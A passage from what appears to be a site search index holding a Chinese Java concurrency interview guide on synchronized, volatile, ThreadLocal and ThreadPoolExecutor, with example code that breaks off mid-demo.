\u0026ldquo;面试突击\u0026rdquo; 即可免费领取！\nJava 工程师必备学习资源: 一些 Java 工程师常用学习资源公众号后台回复关键字 “1” 即可免费无套路获取。\n"},{"id":229,"href":"/java/multi-thread/Java%E5%B9%B6%E5%8F%91%E8%BF%9B%E9%98%B6%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/","title":"Java并发进阶常见面试题总结","parent":"multi-thread","content":"点击关注公众号及时获取笔主最新更新文章，并可免费领取本文档配套的《Java 面试突击》以及 Java 工程师必备学习资源。\n Java 并发进阶常见面试题总结  1.synchronized 关键字  1.1.说一说自己对于 synchronized 关键字的了解 1.2. 说说自己是怎么使用 synchronized 关键字 1.3. 构造方法可以使用 synchronized 关键字修饰么？ 1.3. 讲一下 synchronized 关键字的底层原理  1.3.1. synchronized 同步语句块的情况 1.3.2. synchronized 修饰方法的的情况 1.3.3.总结   1.4. 说说 JDK1.6 之后的 synchronized 关键字底层做了哪些优化，可以详细介绍一下这些优化吗 1.5. 谈谈 synchronized 和 ReentrantLock 的区别  1.5.1. 两者都是可重入锁 1.5.2.synchronized 依赖于 JVM 而 ReentrantLock 依赖于 API 1.5.3.ReentrantLock 比 synchronized 增加了一些高级功能     2. volatile 关键字  2.1. CPU 缓存模型 2.2. 讲一下 JMM(Java 内存模型) 2.3. 并发编程的三个重要特性 2.4. 说说 synchronized 关键字和 volatile 关键字的区别   3. ThreadLocal  3.1. ThreadLocal 简介 3.2. ThreadLocal 示例 3.3. ThreadLocal 原理 3.4. ThreadLocal 内存泄露问题   4. 线程池  4.1. 为什么要用线程池？ 4.2. 实现 Runnable 接口和 Callable 接口的区别 4.3. 执行 execute()方法和 submit()方法的区别是什么呢？ 4.4. 如何创建线程池 4.5 ThreadPoolExecutor 类分析  4.5.1 ThreadPoolExecutor构造函数重要参数分析 4.5.2 ThreadPoolExecutor 饱和策略   4.6 一个简单的线程池 Demo 4.7 线程池原理分析   5. Atomic 原子类  5.1. 介绍一下 Atomic 原子类 5.2. JUC 包中的原子类是哪 4 类? 5.3. 讲讲 AtomicInteger 的使用 5.4. 能不能给我简单介绍一下 AtomicInteger 类的原理   6. AQS  6.1. AQS 介绍 6.2. AQS 原理分析  6.2.1. AQS 原理概览 6.2.2. AQS 对资源的共享方式 6.2.3. AQS 底层使用了模板方法模式   6.3. AQS 组件总结 6.4. 用过 CountDownLatch 么？什么场景下用的？   7 Reference 公众号    Java 并发进阶常见面试题总结    1.synchronized 关键字    1.1.说一说自己对于 synchronized 关键字的了解    synchronized 关键字解决的是多个线程之间访问资源的同步性，synchronized关键字可以保证被它修饰的方法或者代码块在任意时刻只能有一个线程执行。\n另外，在 Java 早期版本中，synchronized 属于 重量级锁，效率低下。\n为什么呢？\n因为监视器锁（monitor）是依赖于底层的操作系统的 Mutex Lock 来实现的，Java 的线程是映射到操作系统的原生线程之上的。如果要挂起或者唤醒一个线程，都需要操作系统帮忙完成，而操作系统实现线程之间的切换时需要从用户态转换到内核态，这个状态之间的转换需要相对比较长的时间，时间成本相对较高。\n庆幸的是在 Java 6 之后 Java 官方对从 JVM 层面对 synchronized 较大优化，所以现在的 synchronized 锁效率也优化得很不错了。JDK1.6 对锁的实现引入了大量的优化，如自旋锁、适应性自旋锁、锁消除、锁粗化、偏向锁、轻量级锁等技术来减少锁操作的开销。\n所以，你会发现目前的话，不论是各种开源框架还是 JDK 源码都大量使用了 synchronized 关键字。\n1.2. 说说自己是怎么使用 synchronized 关键字    synchronized 关键字最主要的三种使用方式：\n1.修饰实例方法: 作用于当前对象实例加锁，进入同步代码前要获得 当前对象实例的锁\nsynchronized void method() { //业务代码 } 2.修饰静态方法: 也就是给当前类加锁，会作用于类的所有对象实例 ，进入同步代码前要获得 当前 class 的锁。因为静态成员不属于任何一个实例对象，是类成员（ static 表明这是该类的一个静态资源，不管 new 了多少个对象，只有一份）。所以，如果一个线程 A 调用一个实例对象的非静态 synchronized 方法，而线程 B 需要调用这个实例对象所属类的静态 synchronized 方法，是允许的，不会发生互斥现象，因为访问静态 synchronized 方法占用的锁是当前类的锁，而访问非静态 synchronized 方法占用的锁是当前实例对象锁。\nsynchronized static void method() { //业务代码 } 3.修饰代码块 ：指定加锁对象，对给定对象/类加锁。synchronized(this|object) 表示进入同步代码库前要获得给定对象的锁。synchronized(类.class) 表示进入同步代码前要获得 当前 class 的锁\nsynchronized(this) { //业务代码 } 总结：\n synchronized 关键字加到 static 静态方法和 synchronized(class) 代码块上都是是给 Class 类上锁。 synchronized 关键字加到实例方法上是给对象实例上锁。 尽量不要使用 synchronized(String a) 因为 JVM 中，字符串常量池具有缓存功能！  下面我以一个常见的面试题为例讲解一下 synchronized 关键字的具体使用。\n面试中面试官经常会说：“单例模式了解吗？来给我手写一下！给我解释一下双重检验锁方式实现单例模式的原理呗！”\n双重校验锁实现对象单例（线程安全）\npublic class Singleton { private volatile static Singleton uniqueInstance; private Singleton() { } public static Singleton getUniqueInstance() { //先判断对象是否已经实例过，没有实例化过才进入加锁代码  if (uniqueInstance == null) { //类对象加锁  synchronized (Singleton.class) { if (uniqueInstance == null) { uniqueInstance = new Singleton(); } } } return uniqueInstance; } } 另外，需要注意 uniqueInstance 采用 volatile 关键字修饰也是很有必要。\nuniqueInstance 采用 volatile 关键字修饰也是很有必要的， uniqueInstance = new Singleton(); 这段代码其实是分为三步执行：\n 为 uniqueInstance 分配内存空间 初始化 uniqueInstance 将 uniqueInstance 指向分配的内存地址  但是由于 JVM 具有指令重排的特性，执行顺序有可能变成 1-\u0026gt;3-\u0026gt;2。指令重排在单线程环境下不会出现问题，但是在多线程环境下会导致一个线程获得还没有初始化的实例。例如，线程 T1 执行了 1 和 3，此时 T2 调用 getUniqueInstance() 后发现 uniqueInstance 不为空，因此返回 uniqueInstance，但此时 uniqueInstance 还未被初始化。\n使用 volatile 可以禁止 JVM 的指令重排，保证在多线程环境下也能正常运行。\n1.3. 构造方法可以使用 synchronized 关键字修饰么？    先说结论：构造方法不能使用 synchronized 关键字修饰。\n构造方法本身就属于线程安全的，不存在同步的构造方法一说。\n1.3. 讲一下 synchronized 关键字的底层原理    synchronized 关键字底层原理属于 JVM 层面。\n1.3.1. synchronized 同步语句块的情况    public class SynchronizedDemo { public void method() { synchronized (this) { System.out.println(\u0026#34;synchronized 代码块\u0026#34;); } } } 通过 JDK 自带的 javap 命令查看 SynchronizedDemo 类的相关字节码信息：首先切换到类的对应目录执行 javac SynchronizedDemo.java 命令生成编译后的 .class 文件，然后执行javap -c -s -v -l SynchronizedDemo.class。\n从上面我们可以看出：\nsynchronized 同步语句块的实现使用的是 monitorenter 和 monitorexit 指令，其中 monitorenter 指令指向同步代码块的开始位置，monitorexit 指令则指明同步代码块的结束位置。\n当执行 monitorenter 指令时，线程试图获取锁也就是获取 对象监视器 monitor 的持有权。\n 在 Java 虚拟机(HotSpot)中，Monitor 是基于 C++实现的，由ObjectMonitor实现的。每个对象中都内置了一个 ObjectMonitor对象。\n另外，wait/notify等方法也依赖于monitor对象，这就是为什么只有在同步的块或者方法中才能调用wait/notify等方法，否则会抛出java.lang.IllegalMonitorStateException的异常的原因。\n 在执行monitorenter时，会尝试获取对象的锁，如果锁的计数器为 0 则表示锁可以被获取，获取后将锁计数器设为 1 也就是加 1。\n在执行 monitorexit 指令后，将锁计数器设为 0，表明锁被释放。如果获取对象锁失败，那当前线程就要阻塞等待，直到锁被另外一个线程释放为止。\n1.3.2. synchronized 修饰方法的的情况    public class SynchronizedDemo2 { public synchronized void method() { System.out.println(\u0026#34;synchronized 方法\u0026#34;); } } synchronized 修饰的方法并没有 monitorenter 指令和 monitorexit 指令，取得代之的确实是 ACC_SYNCHRONIZED 标识，该标识指明了该方法是一个同步方法。JVM 通过该 ACC_SYNCHRONIZED 访问标志来辨别一个方法是否声明为同步方法，从而执行相应的同步调用。\n1.3.3.总结    synchronized 同步语句块的实现使用的是 monitorenter 和 monitorexit 指令，其中 monitorenter 指令指向同步代码块的开始位置，monitorexit 指令则指明同步代码块的结束位置。\nsynchronized 修饰的方法并没有 monitorenter 指令和 monitorexit 指令，取得代之的确实是 ACC_SYNCHRONIZED 标识，该标识指明了该方法是一个同步方法。\n不过两者的本质都是对对象监视器 monitor 的获取。\n1.4. 说说 JDK1.6 之后的 synchronized 关键字底层做了哪些优化，可以详细介绍一下这些优化吗    JDK1.6 对锁的实现引入了大量的优化，如偏向锁、轻量级锁、自旋锁、适应性自旋锁、锁消除、锁粗化等技术来减少锁操作的开销。\n锁主要存在四种状态，依次是：无锁状态、偏向锁状态、轻量级锁状态、重量级锁状态，他们会随着竞争的激烈而逐渐升级。注意锁可以升级不可降级，这种策略是为了提高获得锁和释放锁的效率。\n关于这几种优化的详细信息可以查看下面这篇文章：Java6 及以上版本对 synchronized 的优化\n1.5. 谈谈 synchronized 和 ReentrantLock 的区别    1.5.1. 两者都是可重入锁    “可重入锁” 指的是自己可以再次获取自己的内部锁。比如一个线程获得了某个对象的锁，此时这个对象锁还没有释放，当其再次想要获取这个对象的锁的时候还是可以获取的，如果不可锁重入的话，就会造成死锁。同一个线程每次获取锁，锁的计数器都自增 1，所以要等到锁的计数器下降为 0 时才能释放锁。\n1.5.2.synchronized 依赖于 JVM 而 ReentrantLock 依赖于 API    synchronized 是依赖于 JVM 实现的，前面我们也讲到了 虚拟机团队在 JDK1.6 为 synchronized 关键字进行了很多优化，但是这些优化都是在虚拟机层面实现的，并没有直接暴露给我们。ReentrantLock 是 JDK 层面实现的（也就是 API 层面，需要 lock() 和 unlock() 方法配合 try/finally 语句块来完成），所以我们可以通过查看它的源代码，来看它是如何实现的。\n1.5.3.ReentrantLock 比 synchronized 增加了一些高级功能    相比synchronized，ReentrantLock增加了一些高级功能。主要来说主要有三点：\n 等待可中断 : ReentrantLock提供了一种能够中断等待锁的线程的机制，通过 lock.lockInterruptibly() 来实现这个机制。也就是说正在等待的线程可以选择放弃等待，改为处理其他事情。 可实现公平锁 : ReentrantLock可以指定是公平锁还是非公平锁。而synchronized只能是非公平锁。所谓的公平锁就是先等待的线程先获得锁。ReentrantLock默认情况是非公平的，可以通过 ReentrantLock类的ReentrantLock(boolean fair)构造方法来制定是否是公平的。 可实现选择性通知（锁可以绑定多个条件）: synchronized关键字与wait()和notify()/notifyAll()方法相结合可以实现等待/通知机制。ReentrantLock类当然也可以实现，但是需要借助于Condition接口与newCondition()方法。   Condition是 JDK1.5 之后才有的，它具有很好的灵活性，比如可以实现多路通知功能也就是在一个Lock对象中可以创建多个Condition实例（即对象监视器），线程对象可以注册在指定的Condition中，从而可以有选择性的进行线程通知，在调度线程上更加灵活。 在使用notify()/notifyAll()方法进行通知时，被通知的线程是由 JVM 选择的，用ReentrantLock类结合Condition实例可以实现“选择性通知” ，这个功能非常重要，而且是 Condition 接口默认提供的。而synchronized关键字就相当于整个 Lock 对象中只有一个Condition实例，所有的线程都注册在它一个身上。如果执行notifyAll()方法的话就会通知所有处于等待状态的线程这样会造成很大的效率问题，而Condition实例的signalAll()方法 只会唤醒注册在该Condition实例中的所有等待线程。\n 如果你想使用上述功能，那么选择 ReentrantLock 是一个不错的选择。性能已不是选择标准\n2. volatile 关键字    我们先要从 CPU 缓存模型 说起！\n2.1. CPU 缓存模型    为什么要弄一个 CPU 高速缓存呢？\n类比我们开发网站后台系统使用的缓存（比如 Redis）是为了解决程序处理速度和访问常规关系型数据库速度不对等的问题。 CPU 缓存则是为了解决 CPU 处理速度和内存处理速度不对等的问题。\n我们甚至可以把 内存可以看作外存的高速缓存，程序运行的时候我们把外存的数据复制到内存，由于内存的处理速度远远高于外存，这样提高了处理速度。\n总结：CPU Cache 缓存的是内存数据用于解决 CPU 处理速度和内存不匹配的问题，内存缓存的是硬盘数据用于解决硬盘访问速度过慢的问题。\n为了更好地理解，我画了一个简单的 CPU Cache 示意图如下（实际上，现代的 CPU Cache 通常分为三层，分别叫 L1,L2,L3 Cache）:\nCPU Cache 的工作方式：\n先复制一份数据到 CPU Cache 中，当 CPU 需要用到的时候就可以直接从 CPU Cache 中读取数据，当运算完成后，再将运算得到的数据写回 Main Memory 中。但是，这样存在 内存缓存不一致性的问题 ！比如我执行一个 i++操作的话，如果两个线程同时执行的话，假设两个线程从 CPU Cache 中读取的 i=1，两个线程做了 1++运算完之后再写回 Main Memory 之后 i=2，而正确结果应该是 i=3。\nCPU 为了解决内存缓存不一致性问题可以通过制定缓存一致协议或者其他手段来解决。\n2.2. 讲一下 JMM(Java 内存模型)    在 JDK1.2 之前，Java 的内存模型实现总是从主存（即共享内存）读取变量，是不需要进行特别的注意的。而在当前的 Java 内存模型下，线程可以把变量保存本地内存（比如机器的寄存器）中，而不是直接在主存中进行读写。这就可能造成一个线程在主存中修改了一个变量的值，而另外一个线程还继续使用它在寄存器中的变量值的拷贝，造成数据的不一致。\n要解决这个问题，就需要把变量声明为 volatile ，这就指示 JVM，这个变量是共享且不稳定的，每次使用它都到主存中进行读取。\n所以，volatile 关键字 除了防止 JVM 的指令重排 ，还有一个重要的作用就是保证变量的可见性。\n2.3. 并发编程的三个重要特性     原子性 : 一个的操作或者多次操作，要么所有的操作全部都得到执行并且不会收到任何因素的干扰而中断，要么所有的操作都执行，要么都不执行。synchronized 可以保证代码片段的原子性。 可见性 ：当一个线程对共享变量进行了修改，那么另外的线程都是立即可以看到修改后的最新值。volatile 关键字可以保证共享变量的可见性。 有序性 ：代码在执行的过程中的先后顺序，Java 在编译器以及运行期间的优化，代码的执行顺序未必就是编写代码时候的顺序。volatile 关键字可以禁止指令进行重排序优化。  2.4. 说说 synchronized 关键字和 volatile 关键字的区别    synchronized 关键字和 volatile 关键字是两个互补的存在，而不是对立的存在！\n volatile 关键字是线程同步的轻量级实现，所以 volatile 性能肯定比synchronized关键字要好 。但是 volatile 关键字只能用于变量而 synchronized 关键字可以修饰方法以及代码块 。 volatile 关键字能保证数据的可见性，但不能保证数据的原子性。synchronized 关键字两者都能保证。 volatile关键字主要用于解决变量在多个线程之间的可见性，而 synchronized 关键字解决的是多个线程之间访问资源的同步性。  3. ThreadLocal    3.1. ThreadLocal 简介    通常情况下，我们创建的变量是可以被任何一个线程访问并修改的。如果想实现每一个线程都有自己的专属本地变量该如何解决呢？ JDK 中提供的ThreadLocal类正是为了解决这样的问题。 ThreadLocal类主要解决的就是让每个线程绑定自己的值，可以将ThreadLocal类形象的比喻成存放数据的盒子，盒子中可以存储每个线程的私有数据。\n如果你创建了一个ThreadLocal变量，那么访问这个变量的每个线程都会有这个变量的本地副本，这也是ThreadLocal变量名的由来。他们可以使用 get（） 和 set（） 方法来获取默认值或将其值更改为当前线程所存的副本的值，从而避免了线程安全问题。\n再举个简单的例子：\n比如有两个人去宝屋收集宝物，这两个共用一个袋子的话肯定会产生争执，但是给他们两个人每个人分配一个袋子的话就不会出现这样的问题。如果把这两个人比作线程的话，那么 ThreadLocal 就是用来避免这两个线程竞争的。\n3.2. ThreadLocal 示例    相信看了上面的解释，大家已经搞懂 ThreadLocal 类是个什么东西了。\nimport java.text.SimpleDateFormat; import java.util.Random; public class ThreadLocalExample implements Runnable{ // SimpleDateFormat 不是线程安全的，所以每个线程都要有自己独立的副本  private static final ThreadLocal\u0026lt;SimpleDateFormat\u0026gt; formatter = ThreadLocal.withInitial(() -\u0026gt; new SimpleDateFormat(\u0026#34;yyyyMMdd HHmm\u0026#34;)); public static void main(String[] args) throws InterruptedException { ThreadLocalExample obj = new ThreadLocalExample(); for(int i=0 ; i\u0026lt;10; i++){ Thread t = new Thread(obj, \u0026#34;\u0026#34;+i); Thread.sleep(new Random().nextInt(1000)); t.start(); } } @Override public void run() { System.out.println(\u0026#34;Thread Name= \u0026#34;+Thread.currentThread().getName()+\u0026#34; default Formatter = \u0026#34;+formatter.get().toPattern()); try { Thread.sleep(new Random().nextInt(1000)); } catch (InterruptedException e) { e.printStackTrace(); } //formatter pattern is changed here by thread, but it won\u0026#39;t reflect to other threads  formatter.set(new SimpleDateFormat()); System.out.println(\u0026#34;Thread Name= \u0026#34;+Thread.currentThread().getName()+\u0026#34; formatter = \u0026#34;+formatter.get().toPattern()); } } Output:\nThread Name= 0 default Formatter = yyyyMMdd HHmm Thread Name= 0 formatter = yy-M-d ah:mm Thread Name= 1 default Formatter = yyyyMMdd HHmm Thread Name= 2 default Formatter = yyyyMMdd HHmm Thread Name= 1 formatter = yy-M-d ah:mm Thread Name= 3 default Formatter = yyyyMMdd HHmm Thread Name= 2 formatter = yy-M-d ah:mm Thread Name= 4 default Formatter = yyyyMMdd HHmm Thread Name= 3 formatter = yy-M-d ah:mm Thread Name= 4 formatter = yy-M-d ah:mm Thread Name= 5 default Formatter = yyyyMMdd HHmm Thread Name= 5 formatter = yy-M-d ah:mm Thread Name= 6 default Formatter = yyyyMMdd HHmm Thread Name= 6 formatter = yy-M-d ah:mm Thread Name= 7 default Formatter = yyyyMMdd HHmm Thread Name= 7 formatter = yy-M-d ah:mm Thread Name= 8 default Formatter = yyyyMMdd HHmm Thread Name= 9 default Formatter = yyyyMMdd HHmm Thread Name= 8 formatter = yy-M-d ah:mm Thread Name= 9 formatter = yy-M-d ah:mm 从输出中可以看出，Thread-0 已经改变了 formatter 的值，但仍然是 thread-2 默认格式化程序与初始化值相同，其他线程也一样。\n上面有一段代码用到了创建 ThreadLocal 变量的那段代码用到了 Java8 的知识，它等于下面这段代码，如果你写了下面这段代码的话，IDEA 会提示你转换为 Java8 的格式(IDEA 真的不错！)。因为 ThreadLocal 类在 Java 8 中扩展，使用一个新的方法withInitial()，将 Supplier 功能接口作为参数。\nprivate static final ThreadLocal\u0026lt;SimpleDateFormat\u0026gt; formatter = new ThreadLocal\u0026lt;SimpleDateFormat\u0026gt;(){ @Override protected SimpleDateFormat initialValue(){ return new SimpleDateFormat(\u0026#34;yyyyMMdd HHmm\u0026#34;); } }; 3.3. ThreadLocal 原理    从 Thread类源代码入手。\npublic class Thread implements Runnable { //......  //与此线程有关的ThreadLocal值。由ThreadLocal类维护  ThreadLocal.ThreadLocalMap threadLocals = null; //与此线程有关的InheritableThreadLocal值。由InheritableThreadLocal类维护  ThreadLocal.ThreadLocalMap inheritableThreadLocals = null; //...... } 从上面Thread类 源代码可以看出Thread 类中有一个 threadLocals 和 一个 inheritableThreadLocals 变量，它们都是 ThreadLocalMap 类型的变量,我们可以把 ThreadLocalMap 理解为ThreadLocal 类实现的定制化的 HashMap。默认情况下这两个变量都是 null，只有当前线程调用 ThreadLocal 类的 set或get方法时才创建它们，实际上调用这两个方法的时候，我们调用的是ThreadLocalMap类对应的 get()、set()方法。\nThreadLocal类的set()方法\npublic void set(T value) { Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) map.set(this, value); else createMap(t, value); } ThreadLocalMap getMap(Thread t) { return t.threadLocals; } 通过上面这些内容，我们足以通过猜测得出结论：最终的变量是放在了当前线程的 ThreadLocalMap 中，并不是存在 ThreadLocal 上，ThreadLocal 可以理解为只是ThreadLocalMap的封装，传递了变量值。 ThrealLocal 类中可以通过Thread.currentThread()获取到当前线程对象后，直接通过getMap(Thread t)可以访问到该线程的ThreadLocalMap对象。\n每个Thread中都具备一个ThreadLocalMap，而ThreadLocalMap可以存储以ThreadLocal为 key ，Object 对象为 value 的键值对。\nThreadLocalMap(ThreadLocal\u0026lt;?\u0026gt; firstKey, Object firstValue) { //...... } 比如我们在同一个线程中声明了两个 ThreadLocal 对象的话，会使用 Thread内部都是使用仅有那个ThreadLocalMap 存放数据的，ThreadLocalMap的 key 就是 ThreadLocal对象，value 就是 ThreadLocal 对象调用set方法设置的值。\nThreadLocalMap是ThreadLocal的静态内部类。\n3.4. ThreadLocal 内存泄露问题    ThreadLocalMap 中使用的 key 为 ThreadLocal 的弱引用,而 value 是强引用。所以，如果 ThreadLocal 没有被外部强引用的情况下，在垃圾回收的时候，key 会被清理掉，而 value 不会被清理掉。这样一来，ThreadLocalMap 中就会出现 key 为 null 的 Entry。假如我们不做任何措施的话，value 永远无法被 GC 回收，这个时候就可能会产生内存泄露。ThreadLocalMap 实现中已经考虑了这种情况，在调用 set()、get()、remove() 方法的时候，会清理掉 key 为 null 的记录。使用完 ThreadLocal方法后 最好手动调用remove()方法\nstatic class Entry extends WeakReference\u0026lt;ThreadLocal\u0026lt;?\u0026gt;\u0026gt; { /** The value associated with this ThreadLocal. */ Object value; Entry(ThreadLocal\u0026lt;?\u0026gt; k, Object v) { super(k); value = v; } } 弱引用介绍：\n 如果一个对象只具有弱引用，那就类似于可有可无的生活用品。弱引用与软引用的区别在于：只具有弱引用的对象拥有更短暂的生命周期。在垃圾回收器线程扫描它 所管辖的内存区域的过程中，一旦发现了只具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存。不过，由于垃圾回收器是一个优先级很低的线程， 因此不一定会很快发现那些只具有弱引用的对象。\n弱引用可以和一个引用队列（ReferenceQueue）联合使用，如果弱引用所引用的对象被垃圾回收，Java 虚拟机就会把这个弱引用加入到与之关联的引用队列中。\n 4. 线程池    4.1. 为什么要用线程池？     池化技术想必大家已经屡见不鲜了，线程池、数据库连接池、Http 连接池等等都是对这个思想的应用。池化技术的思想主要是为了减少每次获取资源的消耗，提高对资源的利用率。\n 线程池提供了一种限制和管理资源（包括执行一个任务）。 每个线程池还维护一些基本统计信息，例如已完成任务的数量。\n这里借用《Java 并发编程的艺术》提到的来说一下使用线程池的好处：\n 降低资源消耗。通过重复利用已创建的线程降低线程创建和销毁造成的消耗。 提高响应速度。当任务到达时，任务可以不需要等到线程创建就能立即执行。 提高线程的可管理性。线程是稀缺资源，如果无限制的创建，不仅会消耗系统资源，还会降低系统的稳定性，使用线程池可以进行统一的分配，调优和监控。  4.2. 实现 Runnable 接口和 Callable 接口的区别    Runnable自 Java 1.0 以来一直存在，但Callable仅在 Java 1.5 中引入,目的就是为了来处理Runnable不支持的用例。Runnable 接口 不会返回结果或抛出检查异常，但是 Callable 接口 可以。所以，如果任务不需要返回结果或抛出异常推荐使用 Runnable 接口 ，这样代码看起来会更加简洁。\n工具类 Executors 可以实现将 Runnable 对象转换成 Callable 对象。（Executors.callable(Runnable task) 或 Executors.callable(Runnable task, Object result)）。\nRunnable.java\n@FunctionalInterface public interface Runnable { /** * 被线程执行，没有返回值也无法抛出异常 */ public abstract void run(); } Callable.java\n@FunctionalInterface public interface Callable\u0026lt;V\u0026gt; { /** * 计算结果，或在无法这样做时抛出异常。 * @return 计算得出的结果 * @throws 如果无法计算结果，则抛出异常 */ V call() throws Exception; } 4.3. 执行 execute()方法和 submit()方法的区别是什么呢？     execute()方法用于提交不需要返回值的任务，所以无法判断任务是否被线程池执行成功与否； submit()方法用于提交需要返回值的任务。线程池会返回一个 Future 类型的对象，通过这个 Future 对象可以判断任务是否执行成功，并且可以通过 Future 的 get()方法来获取返回值，get()方法会阻塞当前线程直到任务完成，而使用 get(long timeout，TimeUnit unit)方法则会阻塞当前线程一段时间后立即返回，这时候有可能任务没有执行完。  我们以 AbstractExecutorService 接口 中的一个 submit 方法为例子来看看源代码：\npublic Future\u0026lt;?\u0026gt; submit(Runnable task) { if (task == null) throw new NullPointerException(); RunnableFuture\u0026lt;Void\u0026gt; ftask = newTaskFor(task, null); execute(ftask); return ftask; } 上面方法调用的 newTaskFor 方法返回了一个 FutureTask 对象。\nprotected \u0026lt;T\u0026gt; RunnableFuture\u0026lt;T\u0026gt; newTaskFor(Runnable runnable, T value) { return new FutureTask\u0026lt;T\u0026gt;(runnable, value); } 我们再来看看execute()方法：\npublic void execute(Runnable command) { ... } 4.4. 如何创建线程池    《阿里巴巴 Java 开发手册》中强制线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险\n Executors 返回线程池对象的弊端如下：\n FixedThreadPool 和 SingleThreadExecutor ： 允许请求的队列长度为 Integer.MAX_VALUE ，可能堆积大量的请求，从而导致 OOM。 CachedThreadPool 和 ScheduledThreadPool ： 允许创建的线程数量为 Integer.MAX_VALUE ，可能会创建大量线程，从而导致 OOM。   方式一：通过构造方法实现\n方式二：通过 Executor 框架的工具类 Executors 来实现\n我们可以创建三种类型的 ThreadPoolExecutor：\n FixedThreadPool ： 该方法返回一个固定线程数量的线程池。该线程池中的线程数量始终不变。当有一个新的任务提交时，线程池中若有空闲线程，则立即执行。若没有，则新的任务会被暂存在一个任务队列中，待有线程空闲时，便处理在任务队列中的任务。 SingleThreadExecutor： 方法返回一个只有一个线程的线程池。若多余一个任务被提交到该线程池，任务会被保存在一个任务队列中，待线程空闲，按先入先出的顺序执行队列中的任务。 CachedThreadPool： 该方法返回一个可根据实际情况调整线程数量的线程池。线程池的线程数量不确定，但若有空闲线程可以复用，则会优先使用可复用的线程。若所有线程均在工作，又有新的任务提交，则会创建新的线程处理任务。所有线程在当前任务执行完毕后，将返回线程池进行复用。  对应 Executors 工具类中的方法如图所示：\n4.5 ThreadPoolExecutor 类分析    ThreadPoolExecutor 类中提供的四个构造方法。我们来看最长的那个，其余三个都是在这个构造方法的基础上产生（其他几个构造方法说白点都是给定某些默认参数的构造方法比如默认制定拒绝策略是什么），这里就不贴代码讲了，比较简单。\n/** * 用给定的初始参数创建一个新的ThreadPoolExecutor。 */ public ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue\u0026lt;Runnable\u0026gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) { if (corePoolSize \u0026lt; 0 || maximumPoolSize \u0026lt;= 0 || maximumPoolSize \u0026lt; corePoolSize || keepAliveTime \u0026lt; 0) throw new IllegalArgumentException(); if (workQueue == null || threadFactory == null || handler == null) throw new NullPointerException(); this.corePoolSize = corePoolSize; this.maximumPoolSize = maximumPoolSize; this.workQueue = workQueue; this.keepAliveTime = unit.toNanos(keepAliveTime); this.threadFactory = threadFactory; this.handler = handler; } 下面这些对创建 非常重要，在后面使用线程池的过程中你一定会用到！所以，务必拿着小本本记清楚。\n4.5.1 ThreadPoolExecutor构造函数重要参数分析    ThreadPoolExecutor 3 个最重要的参数：\n corePoolSize : 核心线程数定义了最小可以同时运行的线程数量。 maximumPoolSize : 当队列中存放的任务达到队列容量的时候，当前可以同时运行的线程数量变为最大线程数。 workQueue: 当新任务来的时候会先判断当前运行的线程数量是否达到核心线程数，如果达到的话，新任务就会被存放在队列中。  ThreadPoolExecutor其他常见参数:\n keepAliveTime:当线程池中的线程数量大于 corePoolSize 的时候，如果这时没有新的任务提交，核心线程外的线程不会立即销毁，而是会等待，直到等待的时间超过了 keepAliveTime才会被回收销毁； unit : keepAliveTime 参数的时间单位。 threadFactory :executor 创建新线程的时候会用到。 handler :饱和策略。关于饱和策略下面单独介绍一下。  4.5.2 ThreadPoolExecutor 饱和策略    ThreadPoolExecutor 饱和策略定义:\n如果当前同时运行的线程数量达到最大线程数量并且队列也已经被放满了任务时，ThreadPoolTaskExecutor 定义一些策略:\n ThreadPoolExecutor.AbortPolicy： 抛出 RejectedExecutionException来拒绝新任务的处理。 ThreadPoolExecutor.CallerRunsPolicy： 调用执行自己的线程运行任务，也就是直接在调用execute方法的线程中运行(run)被拒绝的任务，如果执行程序已关闭，则会丢弃该任务。因此这种策略会降低对于新任务提交速度，影响程序的整体性能。如果您的应用程序可以承受此延迟并且你要求任何一个任务请求都要被执行的话，你可以选择这个策略。 ThreadPoolExecutor.DiscardPolicy： 不处理新任务，直接丢弃掉。 ThreadPoolExecutor.DiscardOldestPolicy： 此策略将丢弃最早的未处理的任务请求。  举个例子： Spring 通过 ThreadPoolTaskExecutor 或者我们直接通过 ThreadPoolExecutor 的构造函数创建线程池的时候，当我们不指定 RejectedExecutionHandler 饱和策略的话来配置线程池的时候默认使用的是 ThreadPoolExecutor.AbortPolicy。在默认情况下，ThreadPoolExecutor 将抛出 RejectedExecutionException 来拒绝新来的任务 ，这代表你将丢失对这个任务的处理。 对于可伸缩的应用程序，建议使用 ThreadPoolExecutor.CallerRunsPolicy。当最大池被填满时，此策略为我们提供可伸缩队列。（这个直接查看 ThreadPoolExecutor 的构造函数源码就可以看出，比较简单的原因，这里就不贴代码了）\n4.6 一个简单的线程池 Demo    为了让大家更清楚上面的面试题中的一些概念，我写了一个简单的线程池 Demo。\n首先创建一个 Runnable 接口的实现类（当然也可以是 Callable 接口，我们上面也说了两者的区别。）\nMyRunnable.java\nimport java.util.Date; /** * 这是一个简单的Runnable类，需要大约5秒钟来执行其任务。 * @author shuang.kou */ public class MyRunnable implements Runnable { private String command; public MyRunnable(String s) { this.command = s; } @Override public void run() { System.out.println(Thread.currentThread().getName() + \u0026#34; Start. Time = \u0026#34; + new Date()); processCommand(); System.out.println(Thread.currentThread().getName() + \u0026#34; End. Time = \u0026#34; + new Date()); } private void processCommand() { try { Thread.sleep(5000); } catch (InterruptedException e) { e.printStackTrace(); } } @Override public String toString() { return this.command; } } 编写测试程序，我们这里以阿里巴巴推荐的使用 ThreadPoolExecutor 构造函数自定义参数的方式来创建线程池。\nThreadPoolExecutorDemo.java\nimport java.util.concurrent.ArrayBlockingQueue; import java.util.concurrent.ThreadPoolExecutor; import java.util.concurrent.TimeUnit; public class ThreadPoolExecutorDemo { private static final int CORE_POOL_SIZE = 5; private static final int MAX_POOL_SIZE = 10; private static final int QUEUE_CAPACITY = 100; private static final Long KEEP_ALIVE_TIME = 1L; public static void main(String[] args) { //使用阿里巴巴推荐的创建线程池的方式  //通过ThreadPoolExecutor构造函数自定义参数创建  ThreadPoolExecutor executor = new ThreadPoolExecutor( CORE_POOL_SIZE, MAX_POOL_SIZE, KEEP_ALIVE_TIME, TimeUnit.SECONDS, new 